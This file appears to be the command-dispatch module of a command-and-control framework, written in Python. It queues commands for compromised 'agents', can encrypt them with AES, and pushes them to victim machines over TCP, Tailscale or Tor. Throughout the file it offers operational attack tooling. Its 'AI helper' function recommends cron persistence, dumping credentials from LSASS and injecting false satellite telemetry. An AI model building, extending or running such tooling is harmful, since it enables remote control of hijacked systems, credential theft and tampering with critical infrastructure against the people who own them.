# Ruta: modules/c2/agent_commander.py
#!/usr/bin/env python3
import os, sys, json, argparse, datetime, time, base64, hashlib, socket, uuid, random, string
from pathlib import Path
from getpass import getpass
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import websocket

# ── paths
ROOT          = Path(__file__).resolve().parents[2]
AGENT_FILE    = ROOT / "recon" / "agent_inventory.json"
QUEUE_DIR     = ROOT / "c2" / "queues"
LOG_DIR       = ROOT / "results"
STIX_FILE     = LOG_DIR / "stix_c2_bundle.jsonl"
# ── const
KEY_ENV       = "C2_AES_KEY"
WS_URL        = "ws://localhost:8765"
MAX_QUEUE     = 50
TCP_PORT      = 9001     # default agent listener
TOR_SOCKS     = ("127.0.0.1", 9050)  # local Tor proxy

for p in (QUEUE_DIR, LOG_DIR): p.mkdir(parents=True, exist_ok=True)

# ── util
uuid4 = lambda: str(uuid.uuid4())
b64   = lambda d: base64.b64encode(d).decode()
now   = lambda: datetime.datetime.utcnow().isoformat()

def sha256(s:str) -> str: return hashlib.sha256(s.encode()).hexdigest()
def aes_enc(txt,key):
    k = hashlib.sha256(key.encode()).digest()
    c = AES.new(k, AES.MODE_CBC)
    return b64(c.iv + c.encrypt(pad(txt.encode(), AES.block_size)))

def load_agents()->dict:
    return json.loads(AGENT_FILE.read_text()) if AGENT_FILE.exists() else {}

def log(line:str): print(line)

# ── command queue handling
def queue_cmd(agent, payload):
    q = QUEUE_DIR / f"{agent}.queue"
    q.write_text(q.read_text("") + payload + "\n")
    lines = q.read_text().splitlines()
    if len(lines) > MAX_QUEUE: q.write_text("\n".join(lines[-MAX_QUEUE:]))

# ── audit + stix
def audit(agent, cmd_raw, cmd_enc, enc):
    rec = {
        "id": uuid4(), "ts": now(), "agent": agent,
        "enc": enc, "hash": sha256(cmd_raw),
        "cmd": "[ENCRYPTED]" if enc else cmd_raw
    }
    (LOG_DIR/ f"c2_{datetime.date.today():%Y%m%d}.jsonl").write_text(
        (LOG_DIR/ f"c2_{datetime.date.today():%Y%m%d}.jsonl").read_text("")+json.dumps(rec)+"\n"
    )
    stix = {
        "type":"bundle","id":f"bundle--{uuid4()}","spec_version":"2.1",
        "objects":[
            {"type":"indicator","id":f"indicator--{uuid4()}","created":rec["ts"],
             "modified":rec["ts"],"labels":["c2"],"pattern_type":"stix",
             "pattern":f"[command:value = '{rec['hash']}']"},
            {"type":"observed-data","id":f"observed-data--{uuid4()}","created":rec["ts"],
             "modified":rec["ts"],"first_observed":rec["ts"],"last_observed":rec["ts"],
             "number_observed":1,
             "objects":{"0":{"type":"command","value":rec['cmd']}}}
        ]
    }
    STIX_FILE.write_text(STIX_FILE.read_text("")+json.dumps(stix)+"\n")
    return rec

# ── WS notify
def ws_push(evt,msg):
    try:
        ws=websocket.create_connection(WS_URL,timeout=2)
        ws.send(json.dumps({"ts":now(),"type":evt,"msg":msg}))
        ws.close()
    except: pass

# ── network push
def tcp_push(ip,payload):
    try:
        s=socket.create_connection((ip,TCP_PORT),timeout=3)
        s.sendall(len(payload).to_bytes(4,"big")+payload.encode())
        s.close(); return True
    except: return False
def tor_push(onion,payload):
    try:
        import socks, socket as sk
        s=socks.socksocket()
        s.set_proxy(socks.SOCKS5,*TOR_SOCKS)
        s.connect((onion,TCP_PORT))
        s.sendall(len(payload).to_bytes(4,"big")+payload.encode())
        s.close(); return True
    except: return False

# ── AI helper
def ai_hint(meta):
    out=[]
    if "linux" in meta.get("os","").lower(): out.append("Consider cron-based persistence.")
    if "windows" in meta.get("os","").lower(): out.append("Dump creds with LSASS clone.")
    if "satellite" in meta.get("tags",[]): out.append("Inject modified telemetry.")
    if out: log("[AI] "+" ".join(out))

# ── main
def main():
    ap=argparse.ArgumentParser()
    ap.add_argument("--list",action="store_true")
    ap.add_argument("--agent"); ap.add_argument("--cmd")
    ap.add_argument("--encrypt",action="store_true")
    ap.add_argument("--stix",action="store_true")
    ap.add_argument("--push",action="store_true",help="try live push over net")
    args=ap.parse_args()

    inv=load_agents()
    if args.list:
        [log(f"{k}: {v.get('ip','?')} {v.get('os','?')}") for k,v in inv.items()]
        sys.exit()

    if not args.agent or not args.cmd: ap.print_help(); sys.exit()
    if args.agent not in inv: log("Unknown agent"); sys.exit()

    key=os.getenv(KEY_ENV) or (getpass("AES key: ") if args.encrypt else "")
    payload = aes_enc(args.cmd,key) if args.encrypt else args.cmd
    queue_cmd(args.agent,payload)
    rec=audit(args.agent,args.cmd,payload,args.encrypt) if args.stix else None
    ws_push("c2_cmd",f"{args.agent}:{args.cmd}")
    meta=inv[args.agent]

    pushed=False
    if args.push:
        target_ip=meta.get("ip")
        onion   =meta.get("onion")
        ts_ip   =meta.get("tailscale_ip")
        if target_ip: pushed=tcp_push(target_ip,payload)
        if not pushed and ts_ip: pushed=tcp_push(ts_ip,payload)
        if not pushed and onion: pushed=tor_push(onion,payload)
        log("[Net] pushed" if pushed else "[Net] push failed")

    ai_hint(meta)
    log("[✓] queued & logged")

if __name__=="__main__": main()
